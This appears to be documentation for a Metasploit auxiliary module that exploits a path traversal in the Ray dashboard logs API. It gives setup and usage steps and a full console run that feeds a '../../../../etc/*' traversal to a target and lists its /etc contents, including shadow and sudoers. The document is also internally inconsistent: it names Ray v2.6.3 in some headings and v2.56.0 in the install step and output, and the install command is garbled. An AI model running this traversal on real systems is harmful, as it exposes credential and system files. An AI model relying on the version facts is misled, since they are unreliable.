## Vulnerable Application

Ray (<=v2.56.0) is vulnerable to local filesystem path traversal (CVE assignment pending)

The vulnerability affects:

    * Ray (<=v2.56.0)

This module was successfully tested on:

    * Ray (v2.56.0) on Ubuntu 22.04

### Install and run the vulnerable Ray (v2.6.3)

1. Install your favorite virtualization engine (VirtualBox or VMware) on your preferred platform.
2. Install Kali Linux (or other Linux distro) in your virtualization engine.
3. Install Ray (v2.56.0) in your VM.
   `python3 -m pip install pip install ray==2.56.0`
4. Start the ray service.
   `ray start --head --node-ip-address=<insert ip> --dashboard-host=<insert ip>`


## Verification Steps
1. Install the application
2. Start msfconsole
3. Do: `use auxiliary/gather/ray_dashboard_logs_api_path_traversal`
4. Do: `set rhosts <rhost>`
5. Do: `set FILE_PATH <file path>`
6. Do: `set NODE_ID <node id>`
7. Do: `run`
8. You should get a folder content


## Options

## Scenarios

### Ray (v2.6.3) installed with Docker on Kali Linux 6.6.15
```
msf > use auxiliary/gather/ray_dashboard_logs_api_path_traversal
msf auxiliary(gather/ray_dashboard_logs_api_path_traversal) > set RHOSTS 192.168.1.30
RHOSTS => 192.168.1.30
msf auxiliary(gather/ray_dashboard_logs_api_path_traversal) > set FILE_PATH ../../../../etc/*
FILE_PATH => ../../../../etc/*
msf auxiliary(gather/ray_dashboard_logs_api_path_traversal) > set NODE_ID 14a5f61d1b55a68d3f9d2fe3b07d935de4dabaea567d9589bd7e471f
NODE_ID => 14a5f61d1b55a68d3f9d2fe3b07d935de4dabaea567d9589bd7e471f
msf auxiliary(gather/ray_dashboard_logs_api_path_traversal) > check
[+] 192.168.1.30:8265 - The target is vulnerable. Ray 2.56.0 - path traversal via /api/v0/logs confirmed
msf auxiliary(gather/ray_dashboard_logs_api_path_traversal) > run
[*] Running module against 192.168.1.30
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. Ray 2.56.0 - path traversal via /api/v0/logs confirmed
[+] Filesystem entries found:
  /etc/python3/
  /etc/avahi/
  /etc/emacs/
  /etc/libao.conf
  /etc/openvpn/
  /etc/.pwd.lock
  /etc/sensors.d/
  /etc/environment
  /etc/mpv/
  /etc/hosts.allow
  /etc/manpath.config
  /etc/sane.d/
  /etc/issue.net
  /etc/ifplugd/
  /etc/dkms/
  /etc/rearj.cfg
  /etc/mate-settings-daemon/
  /etc/ca-certificates.conf.dpkg-old
  /etc/ca-certificates.conf
  /etc/PackageKit/
  /etc/brltty.conf
  /etc/mime.types
  /etc/sudo_logsrvd.conf
  /etc/ipp-usb/
  /etc/vulkan/
  /etc/chatscripts/
  /etc/compizconfig/
  /etc/cron.monthly/
  /etc/logrotate.conf
  /etc/passwd
  /etc/mecabrc
  /etc/gdb/
  /etc/logcheck/
  /etc/modules
  /etc/hdparm.conf
  /etc/alternatives/
  /etc/ld-musl-x86_64.d/
  /etc/rc6.d/
  /etc/smi.conf
  /etc/sysctl.d/
  /etc/qemu-ifdown
  /etc/snmp/
  /etc/papersize
  /etc/skel/
  /etc/X11/
  /etc/w3m/
  /etc/inputrc
  /etc/wgetrc
  /etc/systemd/
  /etc/rc5.d/
  /etc/.java/
  /etc/group
  /etc/grafana/
  /etc/kernel-img.conf
  /etc/bash.bashrc
  /etc/legal
  /etc/fwupd/
  /etc/vmware-installer/
  /etc/update-manager/
  /etc/ld-musl-x86_64.path
  /etc/kernel/
  /etc/bash_completion
  /etc/dconf/
  /etc/sysctl.conf
  /etc/depmod.d/
  /etc/nanorc
  /etc/iproute2/
  /etc/ubuntu-advantage/
  /etc/UPower/
  /etc/shadow-
  /etc/mono/
  /etc/pam.conf
  /etc/bluetooth/
  /etc/bogofilter.cf
  /etc/mke2fs.conf
  /etc/prime-discrete
  /etc/screenrc
  /etc/OpenCL/
  /etc/xinetd.conf
  /etc/netplan/
  /etc/cron.d/
  /etc/proxychains4.conf
  /etc/localtime
  /etc/lightdm/
  /etc/perl/
  /etc/gtk-2.0/
  /etc/geoclue/
  /etc/rpc
  /etc/zsh_command_not_found
  /etc/sudo.conf
  /etc/mailcap
  /etc/libpaper.d/
  /etc/dpkg/
  /etc/wpa_supplicant/
  /etc/libaudit.conf
  /etc/cryptsetup-initramfs/
  /etc/cracklib/
  /etc/ppp/
  /etc/tmpfiles.d/
  /etc/security/
  /etc/ethertypes
  /etc/subuid-
  /etc/samba/
  /etc/subgid-
  /etc/xml/
  /etc/rc1.d/
  /etc/polkit-1/
  /etc/libnl-3/
  /etc/vtrgb
  /etc/printcap
  /etc/nftables.conf
  /etc/shadow
  /etc/gufw/
  /etc/udev/
  /etc/hostid
  /etc/resolv.conf
  /etc/rc3.d/
  /etc/init.d/
  /etc/apt/
  /etc/machine-id
  /etc/ld.so.cache
  /etc/network/
  /etc/rc4.d/
  /etc/dbus-1/
  /etc/libreoffice/
  /etc/pulse/
  /etc/tor/
  /etc/openal/
  /etc/opt/
  /etc/issue
  /etc/matplotlibrc
  /etc/subuid
  /etc/thermald/
  /etc/python3.10/
  /etc/group-
  /etc/gtk-3.0/
  /etc/sudoers.d/
  /etc/apm/
  /etc/cron.daily/
  /etc/ca-certificates/
  /etc/magic
  /etc/vmware-vix/
  /etc/modules-load.d/
  /etc/networks
  /etc/mosquitto/
  /etc/vim/
  /etc/brltty/
  /etc/environment.d/
  /etc/os-release
  /etc/speech-dispatcher/
  /etc/alsa/
  /etc/acpi/
  /etc/host.conf
  /etc/profile
  /etc/pcmcia/
  /etc/rc2.d/
  /etc/nsswitch.conf
  /etc/hp/
  /etc/profile.d/
  /etc/udisks2/
  /etc/deluser.conf
  /etc/hostname
  /etc/passwd-
  /etc/tlp.d/
  /etc/pki/
  /etc/magic.mime
  /etc/debconf.conf
  /etc/usb_modeswitch.conf
  /etc/nikto/
  /etc/crontab
  /etc/ssh/
  /etc/locale.gen
  /etc/console-setup/
  /etc/dhcp/
  /etc/rsyslog.d/
  /etc/mailcap.order
  /etc/selinux/
  /etc/glvnd/
  /etc/lcovrc
  /etc/java-11-openjdk/
  /etc/ufw/
  /etc/fonts/
  /etc/debian_version
  /etc/modprobe.d/
  /etc/mtab
  /etc/ghostscript/
  /etc/initramfs-tools/
  /etc/vbox/
  /etc/sgml/
  /etc/ltrace.conf
  /etc/qemu-ifup
  /etc/java-8-openjdk/
  /etc/apport/
  /etc/ucf.conf
  /etc/brlapi.key
  /etc/sensors3.conf
  /etc/kerneloops.conf
  /etc/xdg/
  /etc/guest-session/
  /etc/cups/
  /etc/mysql/
  /etc/ssl/
  /etc/hosts
  /etc/cron.hourly/
  /etc/pnm2ppa.conf
  /etc/ld.so.conf.d/
  /etc/grub.d/
  /etc/gshadow-
  /etc/xinetd.d/
  /etc/usb_modeswitch.d/
  /etc/anacrontab
  /etc/binfmt.d/
  /etc/login.defs
  /etc/lsb-release
  /etc/ldap/
  /etc/apache2/
  /etc/logrotate.d/
  /etc/locale.alias
  /etc/firefox/
  /etc/libblockdev/
  /etc/apparmor/
  /etc/xrdb/
  /etc/rcS.d/
  /etc/rmt
  /etc/tlp.conf
  /etc/xattr.conf
  /etc/NetworkManager/
  /etc/init/
  /etc/wireshark/
  /etc/sound/
  /etc/protocols
  /etc/terminfo/
  /etc/libibverbs.d/
  /etc/sudoers
  /etc/pm/
  /etc/hosts.deny
  /etc/gss/
  /etc/update-motd.d/
  /etc/inxi.conf
  /etc/adduser.conf
  /etc/bindresvport.blacklist
  /etc/snmp-mibs-downloader/
  /etc/networkd-dispatcher/
  /etc/rc0.d/
  /etc/pam.d/
  /etc/rsyslog.conf
  /etc/e2scrub.conf
  /etc/lighttpd/
  /etc/fstab
  /etc/gnome/
  /etc/gai.conf
  /etc/update-notifier/
  /etc/netconfig
  /etc/apparmor.d/
  /etc/ModemManager/
  /etc/ImageMagick-6/
  /etc/vdpau_wrapper.cfg
  /etc/cupshelpers/
  /etc/timezone
  /etc/maven/
  /etc/cron.weekly/
  /etc/bash_completion.d/
  /etc/default/
  /etc/groff/
  /etc/fuse.conf
  /etc/ld.so.conf
  /etc/gshadow
  /etc/subgid
  /etc/shells
  /etc/dictionaries-common/
  /etc/newt/
  /etc/services
  /etc/vmware/
[+] Loot stored in: /home/richard/.msf4/loot/20260718144750_default_192.168.1.30_ray.dashboard.fi_932170.txt
[*] Auxiliary module execution completed
```
